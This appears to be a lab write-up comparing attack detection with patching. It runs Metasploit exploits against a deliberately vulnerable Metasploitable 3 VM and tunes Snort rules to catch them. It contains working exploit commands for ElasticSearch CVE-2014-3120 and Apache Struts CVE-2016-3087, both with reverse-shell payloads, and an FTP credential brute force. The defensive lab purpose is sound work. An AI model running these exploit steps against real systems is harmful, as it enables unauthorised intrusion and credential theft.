# Is it easier to fix the application than to detect attacks? - case Metasploitable 3 and Snort

## Setup - see [setup.md](setup.md)

## Exploits

### Port scan

First thing that have to be done is to investigate what ports are open in the target systems.  Those ports hint what ports and therefore services are available for attacker and could be vulnerable.

#### Attack 

As a precondition for this, I assume that as an attacker we know the IP of the target system. So I opened Powershell in the taget machine and wrote:

```shell
PS C:\Users\vagrant> ipconfig

...
IPv4 Address....................:172.28.128.3
...
```

Now that we now the IP of the target system, let's switch to host system (attacker) and investigate what ports are open. Let's open metasploit console by writing:

```shell
cd /opt/metasploit-framework/bin 

./msfconsole
```

Now we can use nmap to investigate what ports are open in the target system:

```shell
msf > db_nmap 172.28.128.3
...
[*] Nmap: PORT      STATE SERVICE
[*] Nmap: 21/tcp    open  ftp
[*] Nmap: 22/tcp    open  ssh
[*] Nmap: 80/tcp    open  http
[*] Nmap: 4848/tcp  open  appserv-http
[*] Nmap: 8022/tcp  open  oa-system
[*] Nmap: 8080/tcp  open  http-proxy
[*] Nmap: 9200/tcp  open  wap-wsp
[*] Nmap: 49153/tcp open  unknown
[*] Nmap: 49154/tcp open  unknown
[*] Nmap: 49159/tcp open  unknown
[*] Nmap: 49160/tcp open  unknown
```

Okay, now we have something to work with.

#### Detection

There was no alerts in Snort's console about the port scan. To limit the scope of this project, I will not go into details how we are able to get snort to detect port scans. 

One can also argue that even if Snort or any other IDS (Intrusion Detection System) detects a port scan, what should it do? Blacklist the IP to prevent upcoming attacks? There is probably zero benefit from that, as the attacker rarely use one IP at the first place.

### ElasticSearch

Lets investigate what ports we could use. A decent way to do use is just to use browser and investigate:

e.g. if I used following url in my host machine http://172.28.128.3:9200/ , we get the following response:

```json
{
  ...
  "version" : {
    ...
    "lucene_version" : "4.7"
  },
  ...
}
```

Aha! Lucene hits that this could be ElasticSearch. 

#### Attack

Luckily for use, we can try to use [CVE-2014-3120](https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=2014-3120) and metasploits exploit/multi/elasticsearch/script_mvel_rce:

```shell
> use exploit/multi/elasticsearch/script_mvel_rce

> set payload java/shell/reverse_tcp
> set RHOST 172.28.128.3
> set RPORT 9200

> run

C:\Program Files\elasticsearch-1.1.1>
```
And we have a command line access in a target machine!

#### Detection

Although we gained command line access to our target machine, Snort (that has been plugged to investigate traffic into target matchine) did not alert anything. 

Let's investigate our Snort rules, is there something related to our vulnerability, CVE-2014-3120:

```shell
tkasu$ grep '2014-3120' ./*

./server-other.rules:# alert tcp $EXTERNAL_NET any -> $HOME_NET 9200 (msg:"SERVER-OTHER ElasticSearch script remote code execution attempt"; ...

./server-other.rules:# alert tcp $EXTERNAL_NET any -> $HOME_NET 9200 (msg:"SERVER-OTHER ElasticSearch information disclosure attempt"; ...

```
As we can see, server-other.rules has 2 rules related to our vulnerability, but they are commented out (# in the beginning of the line) in default! Let's uncomment the rows and try again:

```shell
03/19-19:24:58.432413  [**] [1:33830:2] SERVER-OTHER ElasticSearch script remote code execution attempt [**] [Classification: Attempted User Privilege Gain] [Priority: 1]
```

Now it works!

### Apache Struts

When investigating this vulnerability, I assume that we know that there is public web application running at http://172.28.128.3:8282/struts2-rest-showcase/orders/. Also, I assume that is public knowledge that the page is done with [Apache Struts](https://struts.apache.org/) or it can be identified from the page.

#### Attack

Against Struts, we can try metasploit's exploit/multi/http/struts_dmi_rest_exec / [CVE-2016-3087](http://www.cvedetails.com/cve/cve-2016-3087) to gain remote code access rights.

```shell
> use exploit/multi/http/struts_dmi_rest_exec
> set payload windows/meterpreter/reverse_http

> set RHOST 172.28.128.3
> set RPORT 8282
> set TAGETURI /struts2-rest-showcase/orders/
> run

meterpreter >
```

And again we have a command line access.


#### Detection

Again, the default configuration and rules of snort did not detect the attack. However, when I investigate the rules it seems that we have enable all the needed rules but still no detection?

Let's investigate snort.conf. It seems that I have missed the configuration in the used application ports:

```shell
portvar HTTP_PORTS [...,8280,8300,...]
```
So I added 8282, but still no detection. 

Metasploit is able evade Snort as the preprosessor rules are not configured properly. So as a final step, I need to add the port to the HTTP normalization preprosessor configuration as well:

```shell
# HTTP normalization and anomaly detection.
ports {...8282...}
```

And when I run the exploit again:

```shell
04/09-12:07:17.139087  [**] [1:39191:1] SERVER-APACHE Apache Struts remote code execution attempt [**] [Classification: Attempted Administrator Privilege Gain] [Priority: 1]
```
Success!

### FTP

As nmap show that port 21/tcp ftp is open, we can try to brute force for default or weak admin credentials. 

#### Attack

To brute force FTP credentials, we can use metasploits auxiliary/scanner/ftp/ftp_login and user and pass_lists provided by metasploit.

```shell

> use auxiliary/scanner/ftp/ftp_login
> set pass_file /opt/metasploit-framework/embedded/framework/data/wordlists/unix_passwords.txt
> set user_file /opt/metasploit-framework/embedded/framework/data/wordlists/unix_users.txt 
> set RHOSTS 172.28.128.3

> run

# 20 minutes later..
[+] 172.28.128.3:21       - 172.28.128.3:21 - LOGIN SUCCESSFUL: administrator:vagrant

```

It seems we get the credentials! I also verified that the credentials used via FTP.

#### Detection

By default, Snort don't alert about brute force FTP login attemps. In the registered rules, I was also not able to find such rules. However, it can be so difficult they are incorrect login attemps that can be restricted to port 21.

As I'm not Snort native yet, I googled around and found following rule that we can use to test:

```shell
alert tcp $HOME_NET 21 -> $EXTERNAL_NET any (msg:"ET SCAN Potential FTP Brute-Force attempt"; flow:from_server,established; dsize:<100; content:"530 "; depth:4; pcre:"/530\s+(Login|User|Failed|Not)/smi"; classtype:unsuccessful-user; threshold: type threshold, track by_dst, count 5, seconds 300; sid:2002383; rev:11;)
```

Let's trigger our brute force again and:

```shell
4/10-22:09:30.823796  [**] [1:2002383:11] ET SCAN Potential FTP Brute-Force attempt [**] [Classification: Unsuccessful User Privilege Gain] [Priority: 1]
```

It works! This could be refined further by e.g blacklisting IP's that try to login too many times, etc.

## Discussion

So is it easier to fix the application or is IDS viable altenative for the fix? The first thing that comes to mind based on this experiment that IDSs such as Snort rely very heavily that user knows what he is doing. I made e.g. following mistakes on the way:

1. Some rules were commented out
2. Some ports were not included in various places

Because there is some many possible mistakes that can be done, heavily relying on Snort requires a lot of testing. If you need to heavily configure your IDS that it detects (almost) all possible attacks, fixing the application in the first place have to be really problematic to not do it. The first two vulnerabilities showed here, ElasticSearch and Apache Struts have both been patched.

Third "vulnerability", SSH brute force and weak credentials,  is something that I believe IDS is good for. It's usually relatively easy to detect such attacks and block the upcoming IP's before they have been able to try too many user/pass combinations. This is a natural place for IDS, detecting suspicious behavior, not as a replacement for security patches.



